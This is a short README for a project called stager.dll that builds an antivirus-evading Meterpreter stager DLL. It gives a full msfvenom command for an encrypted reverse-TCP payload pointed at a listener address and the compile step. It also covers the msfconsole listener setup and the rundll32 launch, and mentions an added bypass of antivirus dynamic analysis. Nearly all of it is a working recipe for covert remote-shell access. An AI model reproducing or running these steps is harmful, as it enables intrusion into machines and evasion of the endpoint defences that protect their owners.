# stager.dll
Code from this article: [https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/](https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/)  

**HOW TO:**  
Get MSF5 from official repository (master branch - no official release yet at this time): [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)  

Generate payload that suits your needs, ex:  
```ruby msfvenom -p windows/meterpreter/reverse_tcp_rc4 EXIT_FUNC=PROCESS LHOST-192.168.1.24 LPORT=443 RC4PASSWORD=GeekIsChic --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /tmp/meterpreter.c```  

Replace the payload in stager.cpp  and build the DLL on a Windows machine with ```cl /LD /MT /EHa stager.cpp aes.cpp```  

![https://phackt.com/public/images/stager/stager2.png](https://phackt.com/public/images/stager/stager2.png)  

*N.B: I added a dynamic analysis bypass taken from this article: [https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf](https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf)*  

Now update meterpreter.rc and run:
```
ruby msfconsole -r <path_to_repo>/meterpreter.rc
```

Then run ```rundll32 stager.dll,Exec```  

![https://phackt.com/public/images/stager/stager1.png](https://phackt.com/public/images/stager/stager1.png)  



Soon i will write how to create a macro with an obfuscated powershell DLL dropper (Invoke-Obfuscation). Keep in touch.
